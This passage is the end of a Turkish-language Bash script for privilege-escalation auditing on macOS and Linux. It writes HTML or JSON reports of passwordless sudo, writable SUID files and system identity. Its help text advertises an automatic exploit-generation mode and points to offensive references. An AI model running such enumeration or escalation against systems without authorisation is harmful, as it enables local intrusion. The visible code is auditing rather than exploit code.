            vuln_html+='<div class="vuln-item"><div class="vuln-title">⚠️ SUDO NOPASSWD</div><div class="vuln-detail">Şifresiz root erişimi mümkün!</div></div>'
        fi
        for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
            if [[ -w "$f" ]]; then
                vuln_html+="<div class='vuln-item'><div class='vuln-title'>⚠️ Yazılabilir SUID</div><div class='vuln-detail'>$f</div></div>"
            fi
        done
        [[ -z "$vuln_html" ]] && vuln_html='<div class="vuln-item success"><div class="vuln-title">✓ Kritik bulgu yok</div><div class="vuln-detail">Sistemde kritik zafiyet tespit edilmedi.</div></div>'
        sed -i "s|REPLACEVULNS|$vuln_html|g" "$report_file"
        
    elif [[ "$report_type" == "json" ]]; then
        if [[ "$IS_MACOS" == "true" ]]; then
            JSON_OS=$(sw_vers -productVersion 2>/dev/null)
        else
            JSON_OS="$PLATFORM $(uname -r)"
        fi
        cat > "$report_file" << JSONEOF
{
  "tool": "$TOOL_NAME",
  "version": "$VERSION",
  "timestamp": "$(date -Iseconds)",
  "system": {
    "hostname": "$(hostname)",
    "user": "$(whoami)",
    "uid": $(id -u),
    "os_version": "$JSON_OS",
    "kernel": "$(uname -r)"
  },
  "findings": {
    "is_root": $(id -u 2>/dev/null),
    "sudo_nopasswd": $(sudo -n true 2>/dev/null && echo "true" || echo "false"),
    "suid_count": $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | wc -l)
  }
}
JSONEOF
    fi
    
    print_good "Rapor oluşturuldu: $report_file"
}

if [[ "$REPORT_FORMAT" == "html" ]]; then
    [[ -z "$OUTPUT_FILE" ]] && OUTPUT_FILE="rapor_$(date +%Y%m%d_%H%M%S).html"
    generate_report "html" "$OUTPUT_FILE"
    exit 0
fi

if [[ "$REPORT_FORMAT" == "json" ]]; then
    [[ -z "$OUTPUT_FILE" ]] && OUTPUT_FILE="rapor_$(date +%Y%m%d_%H%M%S).json"
    generate_report "json" "$OUTPUT_FILE"
    exit 0
fi

echo ""
echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}${BOLD}  TARAMA TAMAMLANDI - $TOOL_NAME v$VERSION                                   ${NC}"
echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Çıktı dosyası: ${OUTPUT_FILE:-stdout}"
echo "Tarih: $(date)"
echo ""
echo -e "${MAGENTA}🤖 Gelişmiş Özellikler:${NC}"
echo "  -i          → İnteraktif mod"
echo "  -a          → AI akıllı analiz modu"
echo "  -p          → Paralel tarama"
echo "  -e          → Exploit modu (otomatik exploit üret)"
echo "  -F          → Tam kapsamlı analiz (tüm taramalar)"
echo "  -N          → Ağ güvenlik taraması"
echo "  -D          → Derinlemesine tarama"
echo "  -P          → Kalıcılık & arka kapı taraması"
echo "  -C          → CVE tarama modu"
echo ""
echo -e "${MAGENTA}Raporlama:${NC}"
echo "  $0 -r html -o rapor.html  → HTML rapor oluştur"
echo "  $0 -r json -o rapor.json  → JSON rapor oluştur"
echo ""
echo -e "${MAGENTA}Örnek Kullanımlar:${NC}"
echo "  $0 -F                      → Tam kapsamlı analiz"
echo "  $0 -a -e                   → AI analiz + exploit üret"
echo "  $0 -r html -o rapor.html   → HTML rapor"
echo "  $0 -i                      → İnteraktif mod"
echo "  $0 -f -v -o sonuc.txt      → Hızlı tarama + dosyaya"
echo "  $0 -F -r html -o rapor.html → Tam analiz + HTML rapor"
echo ""
echo -e "${MAGENTA}Referanslar:${NC}"
echo "  - GTFOBins: https://gtfobins.github.io/"
echo "  - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
echo "  - HackTricks: https://book.hacktricks.xyz/"
echo "  - macOS Exploits: https://github.com/nickvourd/Privilege-Escalation"
echo ""
echo -e "${MAGENTA}👤 Geliştirici:${NC}"
echo "  - GitHub: https://github.com/vedattascier/mac-os-yetki-yukseltme"
echo "  - Web: https://www.vedattascier.com"
echo ""
